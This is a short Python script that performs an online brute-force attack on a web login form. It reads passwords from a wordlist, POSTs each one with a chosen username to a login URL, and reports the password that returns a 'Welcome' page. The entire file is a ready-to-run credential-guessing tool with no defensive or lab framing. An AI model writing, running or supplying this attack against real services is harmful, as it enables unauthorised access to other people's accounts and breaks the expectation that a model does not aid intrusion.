import requests

def brute_force(server_address, username, password_file):
    try:
        # Open the file with the list of passwords
        with open(password_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"Error: The file {password_file} was not found.")
        return None

    # Iterate through each password
    for password in passwords:
        password = password.strip()
        print(f"Trying password: {password}")

        # Make a request to the server
        try:
            response = requests.post(server_address, data={'username': username, 'password': password})

            # Check the response to see if the password is correct
            if response.status_code == 200 and 'Welcome' in response.text:
                print(f"Password found: {password}")
                return password
            elif response.status_code == 200 and 'Invalid password' in response.text:
                continue
            else:
                print(f"Unexpected response: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            print(f"Error: Could not connect to the server. {e}")
            return None

    print("Password not found")
    return None

if __name__ == "__main__":
    # Get user inputs
    server_address = input("Enter the server address (e.g., http://example.com/login): ")
    username = input("Enter the username: ")
    password_file = input("Enter the path to the password file: ")

    # Run the brute force attack
    found_password = brute_force(server_address, username, password_file)
    if found_password:
        print(f"The correct password is: {found_password}")
    else:
        print("Failed to find the correct password.")
